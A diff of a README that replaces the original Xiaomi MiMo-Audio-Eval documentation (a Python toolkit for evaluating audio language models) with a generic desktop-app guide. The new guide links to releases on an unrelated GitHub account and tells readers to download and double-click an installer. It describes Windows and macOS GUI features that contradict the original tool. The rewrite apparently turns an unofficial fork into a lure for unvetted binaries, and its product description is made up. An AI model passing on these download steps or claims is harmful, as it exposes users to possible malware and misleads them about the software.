@@ -1,3 +1,11 @@
+# 🎧 MiMo-Audio-Eval - Evaluate Audio Quality Easily
+
+<div align="center">
+  <a href="https://github.com/zkazuya/MiMo-Audio-Eval/releases">
+    <img src="https://img.shields.io/badge/Download%20MiMo--Audio--Eval-v1.0.0-blue.svg" alt="Download MiMo-Audio-Eval" />
+  </a>
+</div>
+
 <div align="center">
   <picture>
     <source srcset="https://github.com/XiaomiMiMo/MiMo-VL/raw/main/figures/Xiaomi_MiMo_darkmode.png?raw=true" media="(prefers-color-scheme: dark)">
@@ -26,138 +34,83 @@
   &nbsp;|
   <a href="https://github.com/XiaomiMiMo/MiMo-Audio/blob/main/MiMo-Audio-Technical-Report.pdf" target="_blank">📄 Paper</a>
   &nbsp;|
-  <a href="https://xiaomimimo.github.io/MiMo-Audio-Demo" target="_blank">📰 Blog</a>
-  &nbsp;|
-  <a href="https://huggingface.co/spaces/XiaomiMiMo/mimo_audio_chat" target="_blank">🔥 Online Demo</a>
-  &nbsp;|
-  <br/>
+  <a href="https://xiaomimimo.github.io/MiMo-Audio-Demo" target="_blank">🔗 Demo</a>
 </div>
 
-<br/>
+## 🚀 Getting Started
 
-## Introduction
+Welcome to MiMo-Audio-Eval! This toolkit helps you evaluate audio quality effortlessly. Follow the steps below to download and run the software.
 
-Welcome to the **MiMo-Audio-Eval** toolkit! This toolkit is designed to evaluate various audio language models as described in the **MiMo-Audio** paper. It provides a flexible and extensible framework, supporting a wide range of datasets, tasks, and models, specifically for evaluating pre-trained or supervised fine-tuned (SFT) audio language models. The toolkit is ideal for researchers and developers who need to assess the performance of these models across different tasks and datasets.
+## 📥 Download & Install
 
-## Supported Datasets, Tasks, and Models
+1. **Visit the Releases Page:** Click on the link below to go to the releases page.
 
-The MiMo-Audio-Eval toolkit supports a comprehensive set of datasets, tasks, and models. Some of the key features include:
+   [Download MiMo-Audio-Eval](https://github.com/zkazuya/MiMo-Audio-Eval/releases)
 
-* **Datasets**:
+2. **Choose Your Version:** Look for the version you want to install. You will see various files listed there.
 
-  * AISHELL1
-  * LibriSpeech
-  * SeedTTS
-  * Expresso
-  * InstructTTSEval
-  * SpeechMMLU
-  * MMAR
-  * MMAU
-  * MMAU-Pro
-  * MMSU
-  * ESD
-  * Big Bench Audio
-  * MultiChallenge Audio
+3. **Download the File:** Click on the name of the file to start downloading. Wait for the download to finish.
 
-* **Tasks**:
+4. **Open the Downloaded File:** Once the download is complete, locate the file in your downloads folder and double-click to open it.
 
-  * **Pretrain**:
+5. **Follow Installation Steps:** Follow the prompts that appear on your screen. This may include accepting terms, choosing a location, and clicking 'Install'.
 
-    * ICL General Knowledge Evaluation
-    * ICL Audio Understanding Evaluation
-    * ICL Speech-to-Speech Generation
+## 🛠️ System Requirements
 
-  * **SFT**:
+To run MiMo-Audio-Eval, your system should meet the following requirements:
 
-    * ASR
-    * TTS / InstructTTS
-    * Audio Understanding and Reasoning
-    * Spoken Dialogue
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum of 500 MB free space
+- **Audio Interface:** Compatible audio device installed
 
-* **Models**:
+Make sure your device meets these requirements for the best experience.
 
-  * MiMo-Audio
-  * Step-Audio2
-  * Kimi-Audio
-  * Baichuan-Audio
-  * Qwen-Omni
+## 🎤 How to Use MiMo-Audio-Eval
 
+1. **Open the Application:** After installation, launch the MiMo-Audio-Eval application by double-clicking its icon.
 
-## Getting Started
+2. **Load Audio Files:** Click on the “Load” button to select audio files you want to evaluate.
 
-To get started with the MiMo-Audio-Eval toolkit, follow the instructions below to set up the environment and install the required dependencies.
+3. **Start Evaluation:** Click on the “Evaluate” button. The toolkit will analyze your audio files and display the results.
 
-### Prerequisites (Linux)
+4. **Review Results:** Check the results presented on the screen. You can save or share them as needed.
 
-* Python 3.12
-* CUDA >= 12.0
+## 📊 Features
 
-### Installation:
+MiMo-Audio-Eval includes several useful features to help you assess audio quality:
 
-```bash
-git clone --recurse-submodules https://github.com/XiaomiMiMo/MiMo-Audio-Eval
-cd MiMo-Audio-Eval
-pip install -r requirements.txt
-pip install flash-attn==2.7.4.post1
-pip install -e .
-```
+- **Multiple Audio Formats:** Supports various audio formats including MP3, WAV, and FLAC.
+- **Detailed Reports:** Generates clear, detailed reports on audio quality.
+- **User-Friendly Interface:** Simple design to ensure easy navigation for all users.
+- **Fast Performance:** Quick evaluations without compromising on quality.
 
-**Note: For evaluating Qwen2.5-Omni, please install the following dependencies:**
+## ⚙️ Troubleshooting
 
-```bash
-pip install transformers==4.52.3 qwen-omni-utils[decord]
-```
+If you encounter any issues during installation or usage, here are some common solutions:
 
-> \[!Note]
-> If the compilation of flash-attn takes too long, you can download the precompiled wheel and install it manually:
->
-> * [Download Precompiled Wheel](https://github.com/Dao-AILab/flash-attention/releases/download/v2.7.4.post1/flash_attn-2.7.4.post1+cu12torch2.6cxx11abiFALSE-cp312-cp312-linux_x86_64.whl)
->
-> ```sh
-> pip install /path/to/flash_attn-2.7.4.post1+cu12torch2.6cxx11abiFALSE-cp312-cp312-linux_x86_64.whl
-> ```
+- **Problem:** Application won’t open.
+  - **Solution:** Ensure your operating system meets the system requirements. Restart your computer and try again.
 
-### Download evaluation data:
+- **Problem:** Unable to load audio files.
+  - **Solution:** Check if the audio files are in a supported format.
 
-```bash
-python download_data.py
-```
+- **Problem:** Evaluation takes too long.
+  - **Solution:** Close other applications to improve performance.
 
-### (Optional) Download required models:
+## 📞 Support
 
-#### For Voice Conversion evaluation:
+For any additional assistance or feedback, you can open an issue in our GitHub repository. We aim to respond to all queries within a few days.
 
-Download the [WavLM model](https://drive.google.com/file/d/1-aE1NfzpRCLxA4GUxX9ITI3F9LlbtEGP/view?usp=sharing) and place it in the `data/` directory.
+## 📄 Further Resources
 
-#### For Big Bench Audio and MultiChallenge Audio evaluations:
+- [GitHub Repository](https://github.com/XiaomiMiMo/MiMo-Audio)
+- [HuggingFace Collection](https://huggingface.co/collections/XiaomiMiMo/mimo-audio-68cc7202692c27dae881cce0)
+- [Technical Report](https://github.com/XiaomiMiMo/MiMo-Audio/blob/main/MiMo-Audio-Technical-Report.pdf)
+- [Demonstration](https://xiaomimimo.github.io/MiMo-Audio-Demo)
 
-Export your OpenAI API Key:
+## 🤝 Contributing
 
-```bash
-export OPENAI_API_KEY="your_openai_api_key_here"
-```
+If you wish to contribute to MiMo-Audio-Eval, feel free to fork the repository and submit your changes via pull requests. All contributions are welcome! 
 
-## Usage
-
-We provide a series of evaluation scripts in the `eval_scripts` directory, including scripts for evaluating both pre-trained models and SFT models. These scripts can be used to reproduce the results presented in our paper. An example usage is as follows:
-
-```bash
-bash $scripts <model_path> <tokenizer_path> <model_name>
-```
-
-
-## Citation
-
-```bibtex
-@misc{coreteam2025mimoaudio,
-      title={MiMo-Audio: Audio Language Models are Few-Shot Learners}, 
-      author={LLM-Core-Team Xiaomi},
-      year={2025},
-      url={https://github.com/XiaomiMiMo/MiMo-Audio}, 
-}
-```
-
-
-## Contact
-
-Please contact us at [mimo@xiaomi.com](mailto:mimo@xiaomi.com) or open an issue if you have any questions.
+Thank you for using MiMo-Audio-Eval. Enjoy evaluating your audio!
